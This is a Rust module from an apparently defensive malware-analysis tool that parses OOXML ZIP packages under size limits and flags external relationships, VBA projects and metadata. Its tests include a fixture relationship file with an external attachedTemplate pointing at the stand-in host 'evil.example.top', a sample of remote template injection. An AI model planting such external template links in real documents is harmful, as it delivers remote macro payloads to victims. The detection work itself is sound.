//! OOXML (`.docx`, `.xlsx`, `.pptx`) — a ZIP of XML parts.
//!
//! The parts an analyst cares about are rarely the document body. They are the
//! relationship files: a `TargetMode="External"` `attachedTemplate` is remote
//! template injection, and an external `oleObject` is a remote payload. Those
//! live in small deflated parts, so reading them means inflating — which is why
//! this module carries a ZIP reader rather than only listing names.
//!
//! Everything is bounded: parts over a few megabytes are listed but not
//! inflated, and the total inflated budget is capped, because a document that
//! wants to be a zip bomb is exactly the sort of document that arrives here.

/// One part of the package.
#[derive(Clone, Debug)]
pub struct Part {
    pub name: String,
    /// Offset of the local file header — where `Enter` navigates to.
    pub file_off: u64,
    pub compressed_size: u64,
    pub uncompressed_size: u64,
    pub method: &'static str,
}

/// An external relationship: the shape remote-template injection takes.
#[derive(Clone, Debug)]
pub struct Relationship {
    /// The part the relationship was declared in.
    pub source: String,
    /// Short form of the relationship type (`attachedTemplate`, `oleObject`).
    pub kind: String,
    pub target: String,
    pub external: bool,
}

#[derive(Clone, Debug, Default)]
pub struct Package {
    pub parts: Vec<Part>,
    pub relationships: Vec<Relationship>,
    /// `docProps` values worth showing (creator, last modified by, application).
    pub metadata: Vec<(String, String)>,
    /// Inflated `vbaProject.bin`, when present — a compound file in its own right.
    pub vba_project: Option<Vec<u8>>,
    /// Text of the main document part, for DDE and field inspection.
    pub body_sample: String,
}

const MAX_INFLATE_PART: u64 = 8 * 1024 * 1024;
const MAX_INFLATE_TOTAL: u64 = 64 * 1024 * 1024;

fn u16le(b: &[u8], off: usize) -> u16 {
    b.get(off..off + 2)
        .map(|s| u16::from_le_bytes([s[0], s[1]]))
        .unwrap_or(0)
}
fn u32le(b: &[u8], off: usize) -> u32 {
    b.get(off..off + 4)
        .map(|s| u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
        .unwrap_or(0)
}

/// Does this look like a ZIP (and therefore possibly an OOXML package)?
pub fn is_zip(bytes: &[u8]) -> bool {
    bytes.len() > 4 && &bytes[0..2] == b"PK" && matches!(bytes[2], 3 | 5 | 7)
}

/// Locate the end-of-central-directory record.
fn find_eocd(bytes: &[u8]) -> Option<usize> {
    let start = bytes.len().saturating_sub(66_000);
    (start..bytes.len().saturating_sub(21))
        .rev()
        .find(|&i| &bytes[i..i + 4] == b"PK\x05\x06")
}

/// Inflate `data` (raw deflate) with a hard output cap.
fn inflate(data: &[u8], limit: u64) -> Option<Vec<u8>> {
    use flate2::read::DeflateDecoder;
    use std::io::Read;
    let mut out = Vec::new();
    let mut dec = DeflateDecoder::new(data).take(limit);
    dec.read_to_end(&mut out).ok()?;
    Some(out)
}

/// Read the package: every part listed, the interesting ones inflated.
pub fn parse(bytes: &[u8]) -> Option<Package> {
    if !is_zip(bytes) {
        return None;
    }
    let eocd = find_eocd(bytes)?;
    let count = u16le(bytes, eocd + 10) as usize;
    let cd_off = u32le(bytes, eocd + 16) as usize;

    let mut pkg = Package::default();
    let mut budget = MAX_INFLATE_TOTAL;
    let mut p = cd_off;

    for _ in 0..count.min(8192) {
        if p + 46 > bytes.len() || &bytes[p..p + 4] != b"PK\x01\x02" {
            break;
        }
        let method = u16le(bytes, p + 10);
        let csize = u32le(bytes, p + 20) as u64;
        let usize_ = u32le(bytes, p + 24) as u64;
        let name_len = u16le(bytes, p + 28) as usize;
        let extra_len = u16le(bytes, p + 30) as usize;
        let comment_len = u16le(bytes, p + 32) as usize;
        let local_off = u32le(bytes, p + 42) as u64;
        let name =
            String::from_utf8_lossy(bytes.get(p + 46..p + 46 + name_len).unwrap_or_default())
                .into_owned();

        pkg.parts.push(Part {
            name: name.clone(),
            file_off: local_off,
            compressed_size: csize,
            uncompressed_size: usize_,
            method: match method {
                0 => "stored",
                8 => "deflate",
                _ => "other",
            },
        });

        // Inflate only what answers a question, and only while in budget.
        let wanted = name.ends_with(".rels")
            || name.ends_with("vbaProject.bin")
            || name.starts_with("docProps/")
            || name.ends_with("document.xml")
            || name.ends_with("workbook.xml");
        if wanted && usize_ <= MAX_INFLATE_PART && usize_ <= budget {
            if let Some(data) = part_data(bytes, local_off as usize, method, csize, usize_) {
                budget = budget.saturating_sub(data.len() as u64);
                consume_part(&mut pkg, &name, &data);
            }
        }
        p += 46 + name_len + extra_len + comment_len;
    }
    Some(pkg)
}

/// The bytes of one part, following its local header.
fn part_data(
    bytes: &[u8],
    local_off: usize,
    method: u16,
    csize: u64,
    usize_: u64,
) -> Option<Vec<u8>> {
    if local_off + 30 > bytes.len() || &bytes[local_off..local_off + 4] != b"PK\x03\x04" {
        return None;
    }
    let name_len = u16le(bytes, local_off + 26) as usize;
    let extra_len = u16le(bytes, local_off + 28) as usize;
    let start = local_off + 30 + name_len + extra_len;
    let end = (start + csize as usize).min(bytes.len());
    let raw = bytes.get(start..end)?;
    match method {
        0 => Some(raw.to_vec()),
        8 => inflate(raw, usize_.max(1)),
        _ => None,
    }
}

/// Pull what matters out of an inflated part.
fn consume_part(pkg: &mut Package, name: &str, data: &[u8]) {
    if name.ends_with("vbaProject.bin") {
        pkg.vba_project = Some(data.to_vec());
        return;
    }
    let text = String::from_utf8_lossy(data);
    if name.ends_with(".rels") {
        pkg.relationships.extend(parse_rels(name, &text));
    } else if name.starts_with("docProps/") {
        pkg.metadata.extend(parse_props(&text));
    } else if name.ends_with("document.xml") || name.ends_with("workbook.xml") {
        pkg.body_sample = text.chars().take(256 * 1024).collect();
    }
}

/// Extract `<Relationship .../>` entries. A hand-rolled scan rather than a real
/// XML parser: the shape is fixed, and pulling in an XML stack to read four
/// attributes would be a poor trade in a tool that must never trust its input.
fn parse_rels(source: &str, xml: &str) -> Vec<Relationship> {
    let mut out = Vec::new();
    for chunk in xml.split("<Relationship").skip(1) {
        let end = chunk.find("/>").unwrap_or(chunk.len());
        let tag = &chunk[..end];
        let kind = attr(tag, "Type")
            .map(|t| t.rsplit('/').next().unwrap_or(&t).to_string())
            .unwrap_or_default();
        let Some(target) = attr(tag, "Target") else {
            continue;
        };
        let external = attr(tag, "TargetMode")
            .map(|m| m.eq_ignore_ascii_case("External"))
            .unwrap_or(false);
        out.push(Relationship {
            source: source.to_string(),
            kind,
            target,
            external,
        });
    }
    out
}

/// `docProps/core.xml` and `app.xml` values, by element name.
fn parse_props(xml: &str) -> Vec<(String, String)> {
    const WANTED: &[&str] = &[
        "dc:creator",
        "cp:lastModifiedBy",
        "dcterms:created",
        "dcterms:modified",
        "Application",
        "AppVersion",
        "Company",
        "Template",
        "TotalTime",
    ];
    let mut out = Vec::new();
    for tag in WANTED {
        let open = format!("<{tag}");
        let close = format!("</{tag}>");
        if let Some(i) = xml.find(&open) {
            if let Some(gt) = xml[i..].find('>') {
                let start = i + gt + 1;
                if let Some(j) = xml[start..].find(&close) {
                    let value = xml[start..start + j].trim();
                    if !value.is_empty() {
                        out.push((tag.to_string(), value.to_string()));
                    }
                }
            }
        }
    }
    out
}

/// The value of `name="..."` in a tag body.
fn attr(tag: &str, name: &str) -> Option<String> {
    let key = format!("{name}=\"");
    let i = tag.find(&key)? + key.len();
    let j = tag[i..].find('"')?;
    Some(tag[i..i + j].to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal ZIP with stored (uncompressed) entries.
    fn build_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut directory = Vec::new();
        for (name, data) in entries {
            let local_off = out.len() as u32;
            out.extend_from_slice(b"PK\x03\x04");
            out.extend_from_slice(&[20, 0, 0, 0, 0, 0, 0, 0, 0, 0]); // ver..time
            out.extend_from_slice(&0u32.to_le_bytes()); // crc
            out.extend_from_slice(&(data.len() as u32).to_le_bytes());
            out.extend_from_slice(&(data.len() as u32).to_le_bytes());
            out.extend_from_slice(&(name.len() as u16).to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes());
            out.extend_from_slice(name.as_bytes());
            out.extend_from_slice(data);

            directory.extend_from_slice(b"PK\x01\x02");
            directory.extend_from_slice(&[20, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
            directory.extend_from_slice(&0u32.to_le_bytes()); // crc
            directory.extend_from_slice(&(data.len() as u32).to_le_bytes());
            directory.extend_from_slice(&(data.len() as u32).to_le_bytes());
            directory.extend_from_slice(&(name.len() as u16).to_le_bytes());
            directory.extend_from_slice(&0u16.to_le_bytes()); // extra
            directory.extend_from_slice(&0u16.to_le_bytes()); // comment
            directory.extend_from_slice(&0u16.to_le_bytes()); // disk
            directory.extend_from_slice(&0u16.to_le_bytes()); // int attrs
            directory.extend_from_slice(&0u32.to_le_bytes()); // ext attrs
            directory.extend_from_slice(&local_off.to_le_bytes());
            directory.extend_from_slice(name.as_bytes());
        }
        let cd_off = out.len() as u32;
        let cd_len = directory.len() as u32;
        out.extend_from_slice(&directory);
        out.extend_from_slice(b"PK\x05\x06");
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
        out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
        out.extend_from_slice(&cd_len.to_le_bytes());
        out.extend_from_slice(&cd_off.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }

    const RELS: &[u8] = br#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example.top/t.dotm" TargetMode="External"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
</Relationships>"#;

    #[test]
    fn lists_parts_with_their_offsets() {
        let zip = build_zip(&[
            ("[Content_Types].xml", b"<Types/>"),
            ("word/document.xml", b"<w:document/>"),
        ]);
        let pkg = parse(&zip).expect("package");
        assert_eq!(pkg.parts.len(), 2);
        assert_eq!(pkg.parts[0].name, "[Content_Types].xml");
        assert_eq!(pkg.parts[0].method, "stored");
        // The offset must point at a local file header, so navigating works.
        let off = pkg.parts[1].file_off as usize;
        assert_eq!(&zip[off..off + 4], b"PK\x03\x04");
    }

    #[test]
    fn finds_an_external_template_relationship() {
        let zip = build_zip(&[("word/_rels/settings.xml.rels", RELS)]);
        let pkg = parse(&zip).expect("package");
        let ext: Vec<&Relationship> = pkg.relationships.iter().filter(|r| r.external).collect();
        assert_eq!(ext.len(), 1, "{:?}", pkg.relationships);
        assert_eq!(ext[0].kind, "attachedTemplate");
        assert_eq!(ext[0].target, "http://evil.example.top/t.dotm");
        // The internal one is parsed too, just not external.
        assert!(pkg
            .relationships
            .iter()
            .any(|r| r.kind == "styles" && !r.external));
    }

    #[test]
    fn reads_document_properties() {
        let props = br#"<cp:coreProperties><dc:creator>Bob</dc:creator><cp:lastModifiedBy>attacker</cp:lastModifiedBy></cp:coreProperties>"#;
        let zip = build_zip(&[("docProps/core.xml", props)]);
        let pkg = parse(&zip).expect("package");
        assert!(pkg
            .metadata
            .iter()
            .any(|(k, v)| k == "dc:creator" && v == "Bob"));
        assert!(pkg.metadata.iter().any(|(_, v)| v == "attacker"));
    }

    #[test]
    fn captures_the_vba_project_for_later_parsing() {
        let zip = build_zip(&[("word/vbaProject.bin", b"\xd0\xcf\x11\xe0 not really")]);
        let pkg = parse(&zip).expect("package");
        assert!(pkg.vba_project.is_some());
    }

    #[test]
    fn rejects_things_that_are_not_zips() {
        assert!(parse(b"\xd0\xcf\x11\xe0 compound file").is_none());
        assert!(parse(&[]).is_none());
    }
}
